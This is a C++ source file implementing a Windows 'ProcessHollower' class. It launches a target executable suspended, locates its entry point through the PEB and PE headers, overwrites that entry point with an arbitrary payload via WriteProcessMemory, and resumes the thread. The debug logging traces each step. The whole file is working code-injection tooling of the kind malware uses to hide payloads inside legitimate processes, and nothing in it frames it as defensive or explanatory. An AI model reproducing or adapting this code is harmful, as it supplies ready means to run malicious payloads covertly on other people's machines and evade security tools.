#include "process_hollower.hpp"
#include "crypto_funcs.hpp"
#include <iostream>
#include <iomanip>
#include <cstring>

ProcessHollower::~ProcessHollower() {
    if (hThread && hThread != INVALID_HANDLE_VALUE) {
        CloseHandle(hThread);
    }
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }
}

bool ProcessHollower::create_suspended_process(const wchar_t* target_path) {
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};

    std::cout << "[DEBUG] create_suspended_process() called" << std::endl << std::flush;
    std::cout << "[DEBUG] target_path: " << (target_path ? "valid" : "NULL") << std::endl << std::flush;

    // Initialize StartupInfo
    si.cb = sizeof(STARTUPINFOW);
    std::cout << "[DEBUG] StartupInfo.cb set to: " << si.cb << std::endl << std::flush;

    std::cout << "[*] Creating suspended process..." << std::endl << std::flush;
    std::cout << "[DEBUG] CreateProcessW params:" << std::endl;
    std::cout << "[DEBUG]   lpApplicationName: (NULL - using lpCommandLine)" << std::endl;
    std::cout << "[DEBUG]   lpCommandLine: 0x" << std::hex << (uintptr_t)target_path << std::dec << std::endl;
    std::cout << "[DEBUG]   dwCreationFlags: 0x" << std::hex << CREATE_SUSPENDED << std::dec << std::endl;
    std::cout << "[DEBUG]   lpStartupInfo: 0x" << std::hex << (uintptr_t)&si << std::dec << std::endl;
    std::cout << "[DEBUG]   lpProcessInformation: 0x" << std::hex << (uintptr_t)&pi << std::dec << std::endl << std::flush;

    BOOL result = CreateProcessW(target_path, nullptr, nullptr, nullptr, FALSE,
                                CREATE_SUSPENDED,
                                nullptr, nullptr, &si, &pi);

    if (!result) {
        DWORD err = GetLastError();
        std::cout << "[-] CreateProcessW failed: error " << err << std::endl << std::flush;
        std::cout << "[DEBUG] GetLastError details:" << std::endl;
        std::cout << "[DEBUG]   Error code: " << std::dec << err << " (0x" << std::hex << err << std::dec << ")" << std::endl << std::flush;
        return false;
    }

    hProcess = pi.hProcess;
    hThread = pi.hThread;
    processId = pi.dwProcessId;

    std::cout << "[DEBUG] CreateProcessW successful:" << std::endl;
    std::cout << "[DEBUG]   hProcess: 0x" << std::hex << (uintptr_t)pi.hProcess << std::dec << std::endl;
    std::cout << "[DEBUG]   hThread: 0x" << std::hex << (uintptr_t)pi.hThread << std::dec << std::endl;
    std::cout << "[DEBUG]   dwProcessId: " << std::dec << pi.dwProcessId << std::endl;
    std::cout << "[DEBUG]   dwThreadId: " << pi.dwThreadId << std::endl << std::flush;

    std::cout << "[+] Process created: PID " << processId << ", hProcess=" << hProcess << std::endl << std::flush;

    return true;
}

bool ProcessHollower::HollowProcess(const wchar_t* target_exe, const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] HollowProcess() called with payload size: " << payload.size() << " bytes" << std::endl << std::flush;

    if (!create_suspended_process(target_exe)) {
        std::cout << "[-] Failed to create suspended process\n" << std::flush;
        return false;
    }

    std::cout << "[DEBUG] Attempting NtQueryInformationProcess..." << std::endl << std::flush;
    // Get PEB address
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG ret_len = 0;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                               &pbi, sizeof(pbi), &ret_len);
    if (status != 0) {
        std::cout << "[-] NtQueryInformationProcess failed: status 0x" << std::hex << status << std::endl << std::flush;
        std::cout << "[DEBUG] Return length: " << std::dec << ret_len << std::endl << std::flush;
        return false;
    }
    std::cout << "[DEBUG] NtQueryInformationProcess successful" << std::endl;
    std::cout << "[DEBUG]   PebBaseAddress: 0x" << std::hex << (uintptr_t)pbi.PebBaseAddress << std::endl;
    std::cout << "[+] PEB address: 0x" << std::hex << (uintptr_t)pbi.PebBaseAddress << std::endl << std::flush;

    // Read ImageBase from PEB (offset 0x10)
    uintptr_t image_base = 0;
    SIZE_T bytes_read = 0;
    std::cout << "[DEBUG] Reading ImageBase from PEB+0x10..." << std::endl << std::flush;
    std::cout << "[DEBUG]   PEB address: 0x" << std::hex << (uintptr_t)pbi.PebBaseAddress << std::endl;
    std::cout << "[DEBUG]   Read from: 0x" << (uintptr_t)pbi.PebBaseAddress + 0x10 << std::endl;
    std::cout << "[DEBUG]   Buffer address: 0x" << (uintptr_t)&image_base << std::endl;
    std::cout << "[DEBUG]   Size to read: " << std::dec << sizeof(image_base) << " bytes" << std::endl << std::flush;

    if (!ReadProcessMemory(hProcess, (PVOID)((uintptr_t)pbi.PebBaseAddress + 0x10),
                          &image_base, sizeof(image_base), &bytes_read)) {
        DWORD err = GetLastError();
        std::cout << "[-] ReadProcessMemory (ImageBase) failed: error " << std::dec << err << std::endl << std::flush;
        std::cout << "[DEBUG]   Bytes read: " << bytes_read << std::endl << std::flush;
        return false;
    }
    std::cout << "[DEBUG] ImageBase read successfully" << std::endl;
    std::cout << "[DEBUG]   Bytes read: " << bytes_read << std::endl;
    std::cout << "[+] ImageBase: 0x" << std::hex << image_base << std::endl << std::flush;

    // Read PE header to find entry point
    uint8_t dos_header[0x400] = {};  // Increased to 0x400 to be safe
    std::cout << "[DEBUG] Reading DOS/PE header from ImageBase..." << std::endl << std::flush;
    std::cout << "[DEBUG]   Read from: 0x" << std::hex << image_base << std::endl;
    std::cout << "[DEBUG]   Buffer size: 0x" << std::hex << sizeof(dos_header) << std::endl;
    std::cout << "[DEBUG]   Buffer address: 0x" << (uintptr_t)dos_header << std::dec << std::endl << std::flush;

    if (!ReadProcessMemory(hProcess, (PVOID)image_base, dos_header, sizeof(dos_header), &bytes_read)) {
        DWORD err = GetLastError();
        std::cout << "[-] ReadProcessMemory (DOS header) failed: error " << std::dec << err << std::endl << std::flush;
        std::cout << "[DEBUG]   Bytes read: " << bytes_read << std::endl << std::flush;
        return false;
    }
    std::cout << "[DEBUG] DOS/PE header read successfully" << std::endl;
    std::cout << "[DEBUG]   Bytes read: " << bytes_read << std::endl << std::flush;

    // Verify DOS signature
    uint16_t dos_sig = *(uint16_t*)dos_header;
    std::cout << "[DEBUG] DOS signature at offset 0x0: 0x" << std::hex << dos_sig << std::endl << std::flush;
    if (dos_sig != 0x5A4D) {  // 'MZ'
        std::cout << "[-] Invalid DOS signature! Expected 0x5A4D, got 0x" << std::hex << dos_sig << std::endl << std::flush;
        return false;
    }

    // Get e_lfanew offset to PE header
    uint32_t e_lfanew = *(uint32_t*)(dos_header + 0x3C);
    std::cout << "[DEBUG] e_lfanew at offset 0x3C: 0x" << std::hex << e_lfanew << std::endl << std::flush;

    // Verify PE signature
    uint32_t pe_sig = *(uint32_t*)(dos_header + e_lfanew);
    std::cout << "[DEBUG] PE signature at offset 0x" << std::hex << e_lfanew << ": 0x" << std::hex << pe_sig << std::endl << std::flush;
    if (pe_sig != 0x4550) {  // 'PE\0\0'
        std::cout << "[-] Invalid PE signature! Expected 0x4550, got 0x" << std::hex << pe_sig << std::endl << std::flush;
        return false;
    }

    // Read File Header to get size info
    uint16_t magic = *(uint16_t*)(dos_header + e_lfanew + 24);
    std::cout << "[DEBUG] PE Optional Header Magic at offset 0x" << std::hex << (e_lfanew + 24) << ": 0x" << std::hex << magic << std::endl << std::flush;
    if (magic != 0x20B) {  // 64-bit
        std::cout << "[!] Warning: Not 64-bit PE (magic=0x" << std::hex << magic << ")" << std::endl << std::flush;
    }

    // AddressOfEntryPoint offset in Optional Header is at +0x10 (not +0x28)
    // PE signature (4) + File Header (20) + Optional Header offset (0x10)
    uint32_t opthdr_offset = e_lfanew + 4 + 20 + 0x10;  // AddressOfEntryPoint
    std::cout << "[DEBUG] AddressOfEntryPoint offset calculation:" << std::endl;
    std::cout << "[DEBUG]   e_lfanew: 0x" << std::hex << e_lfanew << std::endl;
    std::cout << "[DEBUG]   PE signature size: 4" << std::endl;
    std::cout << "[DEBUG]   File Header size: 20" << std::endl;
    std::cout << "[DEBUG]   EntryPoint offset in OptHdr: 0x10" << std::endl;
    std::cout << "[DEBUG]   Final offset: 0x" << std::hex << opthdr_offset << std::endl << std::flush;

    if (opthdr_offset + 4 > sizeof(dos_header)) {
        std::cout << "[-] EntryPoint offset out of buffer bounds! offset=0x" << std::hex << opthdr_offset << ", buffer_size=0x" << sizeof(dos_header) << std::endl << std::flush;
        return false;
    }

    uint32_t entry_point_rva = *(uint32_t*)(dos_header + opthdr_offset);
    std::cout << "[DEBUG] EntryPoint RVA read from offset 0x" << std::hex << opthdr_offset << std::endl;
    std::cout << "[+] EntryPoint RVA: 0x" << std::hex << entry_point_rva << std::endl << std::flush;

    uintptr_t entry_point = image_base + entry_point_rva;
    std::cout << "[DEBUG] EntryPoint VA calculation:" << std::endl;
    std::cout << "[DEBUG]   ImageBase: 0x" << std::hex << image_base << std::endl;
    std::cout << "[DEBUG]   EntryPoint RVA: 0x" << std::hex << entry_point_rva << std::endl;
    std::cout << "[DEBUG]   EntryPoint VA: 0x" << std::hex << entry_point << std::endl;
    std::cout << "[+] EntryPoint VA: 0x" << std::hex << entry_point << std::endl << std::flush;

    // Write payload at entry point
    SIZE_T bytes_written = 0;
    std::cout << "[DEBUG] Writing payload..." << std::endl;
    std::cout << "[DEBUG]   Destination: 0x" << std::hex << entry_point << std::endl;
    std::cout << "[DEBUG]   Payload size: 0x" << std::hex << payload.size() << std::endl;
    std::cout << "[DEBUG]   Payload first bytes: " << std::hex;
    for (size_t i = 0; i < (payload.size() > 16 ? 16 : payload.size()); i++) {
        std::cout << (int)payload[i] << " ";
    }
    std::cout << std::dec << std::endl << std::flush;

    if (!WriteProcessMemory(hProcess, (PVOID)entry_point,
                           payload.data(), payload.size(), &bytes_written)) {
        DWORD err = GetLastError();
        std::cout << "[-] WriteProcessMemory failed: error " << std::dec << err << std::endl << std::flush;
        std::cout << "[DEBUG]   Bytes written: " << bytes_written << " / " << payload.size() << std::endl << std::flush;
        return false;
    }

    std::cout << "[+] Payload written: " << std::dec << bytes_written << " / " << payload.size() << " bytes" << std::endl << std::flush;

    // Resume main thread
    std::cout << "[DEBUG] Resuming main thread..." << std::endl;
    std::cout << "[DEBUG]   hThread: 0x" << std::hex << (uintptr_t)hThread << std::dec << std::endl << std::flush;
    DWORD suspend_count = ResumeThread(hThread);
    if (suspend_count == (DWORD)-1) {
        DWORD err = GetLastError();
        std::cout << "[-] ResumeThread failed: error " << std::dec << err << std::endl << std::flush;
        return false;
    }
    std::cout << "[+] Thread resumed (suspend count was: " << suspend_count << ")" << std::endl << std::flush;

    std::cout << "[+] Process hollowing COMPLETE" << std::endl << std::flush;

    return true;
}